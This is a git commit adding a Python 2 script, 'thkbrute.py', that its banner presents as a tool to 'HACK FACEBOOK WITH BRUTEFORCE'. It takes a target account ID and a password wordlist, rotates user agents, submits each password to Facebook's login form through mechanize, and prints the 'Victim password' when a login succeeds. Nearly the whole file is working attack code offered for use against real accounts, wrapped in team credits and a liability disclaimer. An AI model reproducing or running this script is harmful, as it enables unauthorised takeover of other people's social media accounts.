7e30940be3a954c3d1685312082adefab96594b3
d@rk sm1l3 <64733030+itsdarksmile@users.noreply.github.com>
2020-06-11 18:10:57 +0600

    Add files via upload

---
+++ thkbrute.py
@@ -0,0 +1,205 @@
+#!usr
+# -*- coding: UTF-8 -*-
+# MADE BY:MD.MAHID ALAM
+# team:BD THB
+
+
+import os
+import sys
+import time
+import random
+import cookielib
+import mechanize
+
+wd = "\033[90;1m" # dark
+GL = "\033[96;1m" # Blue aqua
+BB = "\033[34;1m" # Blue light
+YY = "\033[33;1m" # Yellow light
+GG = "\033[32;1m" # Green light
+WW = "\033[0;1m"  # White light
+RR = "\033[31;1m" # Red light
+CC = "\033[36;1m" # Cyan light
+B = "\033[34m"    # Blue
+Y = "\033[33;1m"    # Yellow
+G = "\033[32m"    # Green
+W = "\033[0;1m"     # White
+R = "\033[31m"    # Red
+C = "\033[36;1m"    # Cyan
+
+def runntxt(s):
+        for noobs in s + '\n':
+                sys.stdout.write(noobs)
+                sys.stdout.flush()
+                time.sleep(10. / 2100)
+
+
+def banner():
+    os.system('clear')
+    print (" ")
+    runntxt(R+ "!!warning: For any illegal activity the owner of this tool is not responsible!!")
+    runntxt(R+"")
+    runntxt(B+">>>\033[36;1mofficial member of team BD THK\033[34m<<<")
+    runntxt(B+"╰────➲1/CEO:Foyjul Islam Naim")
+    runntxt(B+"╰────➲2/Admin:Masum king")
+    runntxt(B+"╰────➲3/Admin:Zamal")
+    runntxt(B+"╰────➲4/Admin:d@rk 5m!13")
+    
+    runntxt(R+"")
+    runntxt(YY+"                   __________________________")
+    runntxt(YY+"                  |                          |")
+    runntxt(YY+"                  |^_^ .Assalamu-alaikum. ^_^|")
+    runntxt(YY+"                  |__________________________|")
+
+
+    
+    runntxt(BB+"  _____   _  _    _  __    ___     ___    _   _   _____    ___   ")
+    runntxt(BB+" |_   _| | || |  | |/ /   | _ )   | _ \  | | | | |_   _|  | __|  ")
+    runntxt(BB+"   | |   | __ |  | ' <    | _ \   |   /  | |_| |   | |    | _|   ")
+    runntxt(BB+"  _|_|_  |_||_|  |_|\_\   |___/   |_|_\   \___/   _|_|_   |___|  ")
+    runntxt(BB+"_|00 00|_|00 00|_|00 00|_|00 00|_|00 00|_|00 00|_|00 00|_|00 00| ")
+    runntxt(BB+" `-0-0-'_`-0-0-'_`-0-0-'_`-0-0-'_`-0-0-'_`-0-0-'_`-0-0-'_`-0-0-' ")
+
+            
+    runntxt(WW+" ")
+    runntxt(WW+" ")
+    runntxt(WW+" ")
+	    
+    
+    runntxt(W+"  √=============================================√")
+    runntxt(W+"  |\033[31m••••••  HACK FACEBOOK WITH BRUTEFORCE  ••••••\033[0;1m|")
+    runntxt(W+"  √=============================================√")
+    runntxt(W+"  |\033[33;1m            MADE BY:MD.MAHID ALAM            \033[0;1m|")
+    runntxt(W+"  |\033[31m       TRY KORO DEKHO PARBA,HAL CHERO NA     \033[0;1m|")
+    runntxt(W+"  |\033[33;1m            FACEBOOK:realmahidalam           \033[0;1m|")
+    runntxt(W+"  |\033[31m                  TEAM:BD THK                \033[0;1m|")
+    runntxt(W+"  |\033[34m---------------------------------------------\033[0;1m|")
+    runntxt(W+"  |\033[36;1m          LIFE OF SPAMMER (BD THK)           \033[0;1m|")
+    runntxt(W+"  |\033[34m---------------------------------------------\033[0;1m|")
+    runntxt(W+"  √=============================================√")
+    runntxt(W+"  |\033[31m•••••••••       HACK FACEBOOK       •••••••••\033[0;1m|")
+    runntxt(W+"  √=============================================√")
+
+banner()
+
+print wd+"         https://github.com/itsdarksmile"
+print R+"╭────\033[31m[\033[31m INTER TARGET ID\033[31m / \033[31m USERNAME \033[31m ] "
+email_target = str(raw_input(Y+"\033[33;1m╰────➲\033[93m  "))
+print " "
+print R+"\033[31m╭────\033[31m[ \033[31m INTER WORDLIST FILE PATH \033[34m ( 100kpass.txt,pass.txt ) \033[31m ]"
+password_list = str(raw_input(Y+"╰────➲\033[93m "))
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
+# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
+
+def pil():
+                print GG+" "
+                g = str(raw_input("[?] abar hack korun....\033[93;1m[y/n]: "))
+                if g == 'y' or g == 'Y':
+                    os.system('python2 brute.py')
+                elif g == 'n' or g == 'N':
+                    print wd+"program theke bahir hon..."
+                    sys.exit()
+                else:
+                    print RR+"sothik ti nirbacon korun..."
+                    pil()
+
+def edit_wordlist():
+
+        print GG+" "
+        ed = str(raw_input("[?] wordlist edit korben..? \033[96;1m[y/n]: "))
+        if ed == 'y' or ed == 'Y':
+                os.system('nano '+password_list)
+                pil()
+        elif ed == 'n' or ed == 'N':
+                print wd+"program theke bahir hon..."
+                sys.exit()
+
+        else:
+                print RR+"sothik ti nirbacon korun..."
+                edit_wordlist()
+
+def main():
+        global noobs
+        noobs = mechanize.Browser()
+        cj = cookielib.LWPCookieJar()
+        noobs.set_handle_robots(False)
+        noobs.set_handle_redirect(True)
+        noobs.set_cookiejar(cj)
+        noobs.set_handle_equiv(True)
+        noobs.set_handle_referer(True)
+        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+        runn_noobs()
+        life()
+        print " "
+        print RR+" kono password er mil nei (⌣̩̩́_⌣̩̩̀) ..."
+        print " "
+	
+
+def iqbalz(iqbalz_password):
+  try:
+ 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[31m password try ==> \033[91m[\033[32;1m"+iqbalz_password)
+	sys.stdout.flush()
+	noobs.addheaders = [('User-agent', random.choice(useragents))]
+	site = noobs.open(login)
+	noobs.select_form(nr = 0)
+	noobs.form['email'] = email_target
+	noobs.form['pass'] = iqbalz_password
+	tom = noobs.submit()
+	mask = tom.geturl()
+	if mask != login and (not 'login_attempt' in mask):
+                        print " "
+			print ("\033[96m                P A S S W O R D  F I N D ")
+			print "          S U C C E S S F U L L Y"
+                  	print RR+"+-------------------------------------------+"
+	         	print (RR+"$\033[97m Victim id/email:\033[92m {}").format(email_target)
+        	        print (RR+"$\033[97m Victim password:\033[92m {}").format(iqbalz_password)
+        	        print " "
+        	        raw_input(WW+"apni sofol vabe id hack korechen ekhn bahir hote enter capun...")
+			sys.exit(1)
+  
+  
+  except KeyboardInterrupt:
+      print wd+"Stop......."
+      edit_wordlist()
+      sys.exit()    	    
+def life():
+	global iqbalz_password
+	password_nob = open(password_list, "r")
+	for iqbalz_password in password_nob:
+		password_nob = iqbalz_password.replace("\n","")
+		iqbalz(iqbalz_password)		
+
+def runn_noobs():
+         global password_list
+
+         lop = GG+"""
+ (                    )      )  
+   (  )\ )       *   )  ( /(   ( /(  
+ ( )\(()/(     ` )  /(  )\())  )\()) 
+ )((_)/(_))___  ( )(_))((_)\ |((_)\  
+((_)_(_))_|___|(_(_())  _((_)|_ ((_) 
+ | _ )|   \    |_   _| | || || |/ /  
+ | _ \| |) |     | |   | __ |  ' <   
+ |___/|___/      |_|   |_||_| _|\_\ 
+
+                                    _ _   
+                _ __ ___  ___ _   _| | |_ 
+               | '__/ _ \/ __| | | | | __|
+               | | |  __/\__ \ |_| | | |_ 
+               |_|  \___||___/\__,_|_|\__|
+              
+                       \033[34mteam:BD-THK
+              
+      """
+
+
+         print lop
+         nuub = open(password_list, 'r')
+         nuub = nuub.readlines()
+         print R+" [+] ID / Username Target\033[97;1m: {}".format(email_target)
+         print R+" [+] list e password er songkha\033[97;1m:", len(nuub),'ti'
+         print R+" [+] folafol pete opekkha korun\033[97;1m.........."
+         print " "
+
+if __name__=='__main__':
+	main()	
